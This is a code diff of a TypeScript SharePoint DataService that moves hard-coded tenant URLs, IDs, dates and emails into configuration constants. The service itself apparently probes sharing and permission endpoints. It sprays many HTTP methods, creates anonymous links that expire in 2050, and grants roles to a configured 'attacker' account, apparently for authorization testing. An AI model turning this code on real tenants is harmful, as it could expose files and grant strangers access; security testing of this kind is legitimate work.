+          DesignPackageId: SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DocumentLibraryCalloutOfficeWebAppPreviewersDisabled: false,
           EnableMinimalDownload: false,
           FooterColorIndexInDarkMode: 0,
@@ -786,7 +777,7 @@ export default class DataService {
           HeaderLayout: 0,
           HideTitleInHeader: false,
           HorizontalQuickLaunch: false,
-          Id: "27341d3a-24dc-48fc-ae4e-0a439cf859fd",
+          Id: CONFIG.WEB_ID,
           IsEduClass: false,
           IsEduClassProvisionChecked: false,
           IsEduClassProvisionPending: false,
@@ -794,8 +785,8 @@ export default class DataService {
           IsMultilingual: true,
           IsRevertHomepageLinkHidden: false,
           Language: 1033,
-          LastItemModifiedDate: "2025-02-13T14:35:49Z",
-          LastItemUserModifiedDate: "2025-02-13T14:31:02Z",
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           LogoAlignment: 0,
           MasterUrl: "/_catalogs/masterpage/seattle.master",
           MegaMenuEnabled: true,
@@ -803,7 +794,7 @@ export default class DataService {
           NoCrawl: false,
           ObjectCacheEnabled: false,
           OverwriteTranslationsOnChange: false,
-          ResourcePath: { DecodedUrl: "https://tmsobb2.sharepoint.com" },
+          ResourcePath: { DecodedUrl: `${SITE_URL}` },
           QuickLaunchEnabled: true,
           RecycleBinEnabled: true,
           SearchScope: 0,
@@ -815,7 +806,7 @@ export default class DataService {
           TreeViewEnabled: false,
           UIVersion: 15,
           UIVersionConfigurationEnabled: false,
-          Url: "https://tmsobb2.sharepoint.com",
+          Url: `${SITE_URL}`,
           WebTemplate: "SITEPAGEPUBLISHING",
           WelcomePage: "SitePages/test.aspx",
         })
@@ -824,32 +815,31 @@ export default class DataService {
 
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`
+      `${SITE_URL}/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`
     );
 
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
+        `${SITE_URL}/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
         JSON.stringify({
           "odata.metadata":
-            "https://tmsobb2.sharepoint.com/_api/$metadata#SP.ApiData.Webs/@Element",
+            `${SITE_URL}/_api/$metadata#SP.ApiData.Webs/@Element`,
           "odata.type": "SP.Web",
-          "odata.id": "https://tmsobb2.sharepoint.com/_api/Web",
+          "odata.id": `${SITE_URL}/_api/Web`,
           "odata.editLink": "Web",
           AllowRssFeeds: true,
           AlternateCssUrl: "",
-          AppInstanceId: "00000000-0000-0000-0000-000000000000",
+          AppInstanceId: SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           ClassicWelcomePage: null,
           Configuration: 0,
-          Created: "2024-12-23T12:53:13.77",
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
           CurrentChangeToken: {
-            StringValue:
-              "1;2;27341d3a-24dc-48fc-ae4e-0a439cf859fd;638750541870370000;1010560322",
+            StringValue: SHAREPOINT_CONSTANTS.CHANGE_TOKENS.UPDATED_SITE_TOKEN,
           },
           CustomMasterUrl: "/_catalogs/masterpage/seattle.master",
           Description: "",
-          DesignPackageId: "00000000-0000-0000-0000-000000000000",
+          DesignPackageId: SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID,
           DocumentLibraryCalloutOfficeWebAppPreviewersDisabled: false,
           EnableMinimalDownload: false,
           FooterColorIndexInDarkMode: 0,
@@ -863,7 +853,7 @@ export default class DataService {
           HeaderLayout: 0,
           HideTitleInHeader: false,
           HorizontalQuickLaunch: false,
-          Id: "27341d3a-24dc-48fc-ae4e-0a439cf859fd",
+          Id: CONFIG.WEB_ID,
           IsEduClass: false,
           IsEduClassProvisionChecked: false,
           IsEduClassProvisionPending: false,
@@ -871,8 +861,8 @@ export default class DataService {
           IsMultilingual: true,
           IsRevertHomepageLinkHidden: false,
           Language: 1033,
-          LastItemModifiedDate: "2025-02-13T14:35:49Z",
-          LastItemUserModifiedDate: "2025-02-13T14:31:02Z",
+          LastItemModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_MODIFIED,
+          LastItemUserModifiedDate: SHAREPOINT_CONSTANTS.DATES.LAST_USER_MODIFIED,
           LogoAlignment: 0,
           MasterUrl: "/_catalogs/masterpage/seattle.master",
           MegaMenuEnabled: true,
@@ -880,7 +870,7 @@ export default class DataService {
           NoCrawl: false,
           ObjectCacheEnabled: false,
           OverwriteTranslationsOnChange: false,
-          ResourcePath: { DecodedUrl: "https://tmsobb2.sharepoint.com" },
+          ResourcePath: { DecodedUrl: `${SITE_URL}` },
           QuickLaunchEnabled: true,
           RecycleBinEnabled: true,
           SearchScope: 0,
@@ -892,7 +882,7 @@ export default class DataService {
           TreeViewEnabled: false,
           UIVersion: 15,
           UIVersionConfigurationEnabled: false,
-          Url: "https://tmsobb2.sharepoint.com",
+          Url: `${SITE_URL}`,
           WebTemplate: "SITEPAGEPUBLISHING",
           WelcomePage: "SitePages/test.aspx",
         })
@@ -900,16 +890,16 @@ export default class DataService {
     });
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Author`
+      `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Author`
     );
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Author`,
+        `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Author`,
         JSON.stringify({
           Title: "K Testt",
           PrincipalType: 1,
-          Email: "attacker@tmsobb2.onmicrosoft.com",
+          Email: `${CONFIG.SHARING.EMAILS.ATTACKER}`,
           Expiration: "",
           IsEmailAuthenticationGuestUser: false,
           IsShareByEmailGuestUser: false,
@@ -921,108 +911,108 @@ export default class DataService {
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Author`,
+        `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Author`,
         JSON.stringify({
-          Id: 11,
+          Id: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
           ServerRedirectedEmbedUri: null,
           ServerRedirectedEmbedUrl: "",
           ContentTypeId: "0x010A00A37404FF361E30429BA657CF50DB1989",
           Title: "TMSOBB",
           OData__ColorTag: null,
           ComplianceAssetId: null,
-          Name: "i:0#.f|membership|tmsobb@tmsobb2.onmicrosoft.com",
-          EMail: "tmsobb@tmsobb2.onmicrosoft.com",
+          Name: `i:0#.f|membership|${CONFIG.SHARING.EMAILS.TMSOBB}`,
+          EMail: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           OtherMail: null,
           UserExpiration: null,
           UserLastDeletionTime: null,
           MobilePhone: null,
           Notes: null,
-          SipAddress: "tmsobb@tmsobb2.onmicrosoft.com",
+          SipAddress: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           IsSiteAdmin: true,
           Deleted: false,
           UserInfoHidden: false,
           Picture: {
             Description:
-              "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
-            Url: "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
+              SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_URL,
+            Url: SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_URL,
           },
           Department: null,
           JobTitle: null,
           FirstName: "TMSOBB",
           LastName: "Testt",
           WorkPhone: "9075197067",
-          UserName: "tmsobb@tmsobb2.onmicrosoft.com",
+          UserName: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           WebSite: null,
           SPSResponsibility: null,
           Office: null,
-          SPSPictureTimestamp: "63870559229",
+          SPSPictureTimestamp: SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_TIMESTAMP,
           SPSPicturePlaceholderState: 1,
           SPSPictureExchangeSyncState: null,
           SPSUserType: 0,
-          ID: 11,
-          Modified: "2024-12-24T12:02:18Z",
-          Created: "2024-12-23T12:55:38Z",
-          AuthorId: 11,
-          EditorId: 11,
+          ID: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
+          Modified: SHAREPOINT_CONSTANTS.DATES.MODIFIED_DATE,
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
+          AuthorId: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
+          EditorId: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
           OData__UIVersionString: "1.0",
           Attachments: false,
-          GUID: "6a7e2b80-b18d-4bc1-a42c-4fd57c51dcbd",
+          GUID: SHAREPOINT_CONSTANTS.ENTITY_IDS.USER_GUID,
         })
       );
     });
     this.sendRequest2(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`
+      `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`
     );
     HTTPMethods.map((req: any) => {
       this.sendRequest2(
         req,
-        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`,
+        `${SITE_URL}/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`,
         JSON.stringify({
-          Id: 11,
+          Id: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
           ServerRedirectedEmbedUri: null,
           ServerRedirectedEmbedUrl: "",
           ContentTypeId: "0x010A00A37404FF361E30429BA657CF50DB1989",
           Title: "TMSOBB",
           OData__ColorTag: null,
           ComplianceAssetId: null,
-          Name: "i:0#.f|membership|tmsobb@tmsobb2.onmicrosoft.com",
-          EMail: "tmsobb@tmsobb2.onmicrosoft.com",
+          Name: `i:0#.f|membership|${CONFIG.SHARING.EMAILS.TMSOBB}`,
+          EMail: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           OtherMail: null,
           UserExpiration: null,
           UserLastDeletionTime: null,
           MobilePhone: null,
           Notes: null,
-          SipAddress: "tmsobb@tmsobb2.onmicrosoft.com",
+          SipAddress: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           IsSiteAdmin: true,
           Deleted: false,
           UserInfoHidden: false,
           Picture: {
             Description:
-              "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
-            Url: "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
+              SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_URL,
+            Url: SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_URL,
           },
           Department: null,
           JobTitle: null,
           FirstName: "TMSOBB",
           LastName: "Testt",
           WorkPhone: "9075197067",
-          UserName: "tmsobb@tmsobb2.onmicrosoft.com",
+          UserName: `${CONFIG.SHARING.EMAILS.TMSOBB}`,
           WebSite: null,
           SPSResponsibility: null,
           Office: null,
-          SPSPictureTimestamp: "63870559229",
+          SPSPictureTimestamp: SHAREPOINT_CONSTANTS.USERS.TMSOBB_PICTURE_TIMESTAMP,
           SPSPicturePlaceholderState: 1,
           SPSPictureExchangeSyncState: null,
           SPSUserType: 0,
-          ID: 11,
-          Modified: "2024-12-24T12:02:18Z",
-          Created: "2024-12-23T12:55:38Z",
-          AuthorId: 11,
-          EditorId: 11,
+          ID: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
+          Modified: SHAREPOINT_CONSTANTS.DATES.MODIFIED_DATE,
+          Created: SHAREPOINT_CONSTANTS.DATES.CREATED_DATE,
+          AuthorId: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
+          EditorId: SHAREPOINT_CONSTANTS.USERS.TMSOBB_ID,
           OData__UIVersionString: "1.0",
           Attachments: false,
-          GUID: "6a7e2b80-b18d-4bc1-a42c-4fd57c51dcbd",
+          GUID: SHAREPOINT_CONSTANTS.ENTITY_IDS.USER_GUID,
         })
       );
     });
@@ -1033,7 +1023,7 @@ export default class DataService {
     var xhr = new XMLHttpRequest();
     xhr.open(
       "POST",
-      "https://tmsobb2.sharepoint.com/_vti_bin/client.svc/ProcessQuery",
+      `${SITE_URL}/_vti_bin/client.svc/ProcessQuery`,
       true
     );
     xhr.setRequestHeader("accept", "*/*");
@@ -1057,7 +1047,7 @@ export default class DataService {
     var xhr = new XMLHttpRequest();
     xhr.open(
       "POST",
-      "https://tmsobb2.sharepoint.com/_vti_bin/client.svc/ProcessQuery",
+      `${SITE_URL}/_vti_bin/client.svc/ProcessQuery`,
       true
     );
     xhr.setRequestHeader("content-type", "text/xml");
@@ -1078,7 +1068,7 @@ export default class DataService {
       var xhr = new XMLHttpRequest();
       xhr.open(
         "POST",
-        `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/lists\/getByTitle('${listName}')\/items(${itemId})\/comments`,
+        `${SITE_URL}\/_api\/web\/lists\/getByTitle('${listName}')\/items(${itemId})\/comments`,
         true
       );
       xhr.setRequestHeader("content-type", "application/json;charset=utf-8");
@@ -1130,7 +1120,7 @@ export default class DataService {
       var xhr = new XMLHttpRequest();
       xhr.open(
         "POST",
-        `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/lists\/getByTitle('${listName}')\/items(${itemId})\/comments(${no})`,
+        `${SITE_URL}\/_api\/web\/lists\/getByTitle('${listName}')\/items(${itemId})\/comments(${no})`,
         true
       );
       xhr.setRequestHeader("content-type", "application/json;charset=utf-8");
@@ -1312,7 +1302,7 @@ export default class DataService {
         allowAnonymousAccess: true,
         restrictShareMembership: false,
         password: "",
-        expiration: "20501220T000000+0530",
+        expiration: SHAREPOINT_CONSTANTS.DATES.FUTURE_EXPIRATION,
       },
     ];
 
@@ -1339,7 +1329,7 @@ export default class DataService {
             };
             await this.sendRequest(
               "POST",
-              `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
+              `${SITE_URL}/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
               JSON.stringify(payload)
             );
             await this.delay(50);
@@ -1362,7 +1352,7 @@ export default class DataService {
                   allowAnonymousAccess: true,
                   trackLinkUsers: false,
                   linkKind: kid,
-                  expiration: "20501220T000000+0530",
+                  expiration: SHAREPOINT_CONSTANTS.DATES.FUTURE_EXPIRATION,
                   role: rid,
                   restrictShareMembership: false,
                   updatePassword: false,
@@ -1375,14 +1365,14 @@ export default class DataService {
             };
             await this.sendRequest(
               "POST",
-              `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
+              `${SITE_URL}/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
               JSON.stringify(payload)
             );
             await delay(50);
             payload.request.settings.allowAnonymousAccess = false;
             await this.sendRequest(
               "POST",
-              `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
+              `${SITE_URL}/_api/web/Lists(@a1)/ShareLink?@a1=%27${lid}%27`,
               JSON.stringify(payload)
             );
           }
@@ -1396,7 +1386,7 @@ export default class DataService {
       var xhr = new XMLHttpRequest();
       xhr.open(
         "POST",
-        `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/ShareObject?@a1=%27${lid}%27`,
+        `${SITE_URL}\/_api\/web\/Lists(@a1)\/ShareObject?@a1=%27${lid}%27`,
         true
       );
       xhr.setRequestHeader("content-type", "application/json;odata=verbose");
@@ -1410,7 +1400,7 @@ export default class DataService {
         localStorage.getItem("reqd") ?? "*"
       );
       xhr.withCredentials = true;
-      var body = `{\"peoplePickerInput\":\"[{\\\"Key\\\":\\\"attacker@tmsobb2.onmicrosoft.com\\\",\\\"IsResolved\\\":false,\\\"EntityData\\\":{\\\"ObjectId\\\":\\\"e4d5e997-9b18-4527-887e-5484d8d19ba3\\\"},\\\"PeopleType\\\":\\\"Person\\\",\\\"PeopleSubtype\\\":\\\"OrganizationUser\\\"}]\",\"roleValue\":\"role:10737418${kind}\",\"sendEmail\":true,\"emailBody\":\"\",\"includeAnonymousLinkInEmail\":false,\"propagateAcl\":true,\"useSimplifiedRoles\":true}`;
+      var body = `{\"peoplePickerInput\":\"[{\\\"Key\\\":\\\"${CONFIG.SHARING.EMAILS.ATTACKER}\\\",\\\"IsResolved\\\":false,\\\"EntityData\\\":{\\\"ObjectId\\\":\\\"e4d5e997-9b18-4527-887e-5484d8d19ba3\\\"},\\\"PeopleType\\\":\\\"Person\\\",\\\"PeopleSubtype\\\":\\\"OrganizationUser\\\"}]\",\"roleValue\":\"role:10737418${kind}\",\"sendEmail\":true,\"emailBody\":\"\",\"includeAnonymousLinkInEmail\":false,\"propagateAcl\":true,\"useSimplifiedRoles\":true}`;
       var aBody = new Uint8Array(body.length);
       for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
       xhr.send(new Blob([aBody]));
@@ -1422,7 +1412,7 @@ export default class DataService {
         var xhr = new XMLHttpRequest();
         xhr.open(
           "POST",
-          `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/UpdateDocumentSharingInfo?@a1=%27${lid}%27`,
+          `${SITE_URL}\/_api\/web\/Lists(@a1)\/UpdateDocumentSharingInfo?@a1=%27${lid}%27`,
           true
         );
         xhr.setRequestHeader("content-type", "application/json;odata=verbose");
@@ -1447,7 +1437,7 @@ export default class DataService {
         var xhr = new XMLHttpRequest();
         xhr.open(
           "POST",
-          `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/UpdateDocumentSharingInfo?@a1=%27${lid}%27`,
+          `${SITE_URL}\/_api\/web\/Lists(@a1)\/UpdateDocumentSharingInfo?@a1=%27${lid}%27`,
           true
         );
         xhr.setRequestHeader("content-type", "application/json;odata=verbose");
@@ -1471,7 +1461,7 @@ export default class DataService {
   deleteShareListLinks = async () => {
     let res: any = await this.sendRequest(
       "POST",
-      `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/GetSharingInformation?@a1=%27${lid}%27&$Expand=permissionsInformation`,
+      `${SITE_URL}/_api/web/Lists(@a1)/GetSharingInformation?@a1=%27${lid}%27&$Expand=permissionsInformation`,
       JSON.stringify({
         request: { maxPrincipalsToReturn: 100, maxLinkMembersToReturn: 100 },
       })
@@ -1489,7 +1479,7 @@ export default class DataService {
       HTTPMethods.forEach((req: any) => {
         this.sendRequest(
           req,
-          `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/UnshareLink?@a1=%27${lid}%27`,
+          `${SITE_URL}/_api/web/Lists(@a1)/UnshareLink?@a1=%27${lid}%27`,
           JSON.stringify({ linkKind: kind, shareId: shareIds[index] })
         );
       });
@@ -1499,10 +1489,10 @@ export default class DataService {
     //Share Item
     try {
       const personGroup2 = [
-        "attacker@tmsobb2.onmicrosoft.com",
-        "tmsobb@tmsobb2.onmicrosoft.com",
-        "i:0#.f|membership|attacker@tmsobb2.onmicrosoft.com",
-        "i:0#.f|membership|tmsobb@tmsobb2.onmicrosoft.com",
+        `${CONFIG.SHARING.EMAILS.ATTACKER}`,
+        `${CONFIG.SHARING.EMAILS.TMSOBB}`,
+        `i:0#.f|membership|${CONFIG.SHARING.EMAILS.ATTACKER}`,
+        `i:0#.f|membership|${CONFIG.SHARING.EMAILS.TMSOBB}`,
       ];
       for (let pg of personGroup2) {
         for (let role of roles) {
@@ -1538,17 +1528,17 @@ export default class DataService {
           });
           this.sendRequest(
             "POST",
-            `https://tmsobb2.sharepoint.com/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
+            `${SITE_URL}/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
             body
           );
           this.sendRequest(
             "POST",
-            `https://tmsobb2.sharepoint.com/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
+            `${SITE_URL}/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
             body2
           );
           this.sendRequest(
             "POST",
-            `https://tmsobb2.sharepoint.com/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
+            `${SITE_URL}/_api/web/lists/getByTitle('${listName}')/items(${itemId})/shareObject`,
             body3
           );
         }
@@ -1821,7 +1811,7 @@ export default class DataService {
                 var body = `{\"request\":{\"createLink\":true,\"settings\":{\"allowAnonymousAccess\":true,\"trackLinkUsers\":false,\"linkKind\":${kind},\"expiration\":null,\"role\":${role},\"restrictShareMembership\":false,\"shareId\":\"${id}\",\"scope\":${sid},\"nav\":\"\"}}}`;
                 this.sendRequest(
                   req,
-                  `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/GetItemById(@a2)/ShareLink?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27`,
+                  `${SITE_URL}/_api/web/Lists(@a1)/GetItemById(@a2)/ShareLink?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27`,
                   body
                 );
               });
@@ -1847,7 +1837,7 @@ export default class DataService {
             HTTPMethods.forEach((req: any) => {
               this.sendRequest(
                 req,
-                `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/GetItemById(@a2)/ShareLink?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27`,
+                `${SITE_URL}/_api/web/Lists(@a1)/GetItemById(@a2)/ShareLink?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27`,
                 body
               );
             });
@@ -1868,7 +1858,7 @@ export default class DataService {
         var body = `{\"request\":{\"createLink\":true,\"settings\":{\"allowAnonymousAccess\":true,\"trackLinkUsers\":false,\"linkKind\":4,\"expiration\":\"${SHAREPOINT_CONSTANTS.DATES.FUTURE_EXPIRATION}\",\"role\":1,\"restrictShareMembership\":false,\"shareId\":\"${id}\",\"scope\":0,\"nav\":\"\"},\"emailData\":{\"body\":\"\"}}}`;
         this.sendRequest(
           req,
-          `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/GetItemById(@a2)\/ShareLink?@a1=%27${lid}%27&@a2=%27${itemId}%27`,
+          `${SITE_URL}\/_api\/web\/Lists(@a1)\/GetItemById(@a2)\/ShareLink?@a1=%27${lid}%27&@a2=%27${itemId}%27`,
           body
         );
       });
@@ -1921,7 +1911,7 @@ export default class DataService {
     return new Promise(async (resolve, reject) => {
       let res: any = await this.sendRequest(
         "POST",
-        `https://tmsobb2.sharepoint.com/_api/web/Lists(@a1)/GetItemById(@a2)/GetSharingInformation?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&$Expand=pickerSettings,permissionsInformation,sharingLinkTemplates,addressBarLinkSettings`,
+        `${SITE_URL}/_api/web/Lists(@a1)/GetItemById(@a2)/GetSharingInformation?@a1=%27%7B${lid}%7D%27&@a2=%27${itemId}%27&$Expand=pickerSettings,permissionsInformation,sharingLinkTemplates,addressBarLinkSettings`,
         true
       );
       let ShareIds = await res.d.permissionsInformation.links.results.map(
@@ -1933,7 +1923,7 @@ export default class DataService {
   };
   getShareLinkIds2 = async (): Promise<any[]> => {
     return new Promise((resolve, reject) => {
-      let ShareIds: any[] = ["00000000-0000-0000-0000-000000000000"];
+      let ShareIds: any[] = [SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID];
       webObj.lists
         .getById(lid)
         .items.getById(itemId)
@@ -1950,7 +1940,7 @@ export default class DataService {
           ShareIds = await res.permissionsInformation.links.map(
             (link: any) => link.linkDetails.ShareId
           );
-          ShareIds.push("00000000-0000-0000-0000-000000000000");
+          ShareIds.push(SHAREPOINT_CONSTANTS.ENTITY_IDS.EMPTY_GUID);
           console.log(ShareIds);
           resolve(ShareIds); // Resolve the promise with ShareIds
         })
@@ -1968,7 +1958,7 @@ export default class DataService {
         var xhr = new XMLHttpRequest();
         xhr.open(
           "POST",
-          `https:\/\/tmsobb2.sharepoint.com\/_api\/web\/Lists(@a1)\/GetItemById(@a2)\/UnshareLink?@a1=%27${lid}%27&@a2=%27${itemId}%27`,
+          `${SITE_URL}\/_api\/web\/Lists(@a1)\/GetItemById(@a2)\/UnshareLink?@a1=%27${lid}%27&@a2=%27${itemId}%27`,
           true
         );
         xhr.setRequestHeader("content-type", "application/json;odata=verbose");
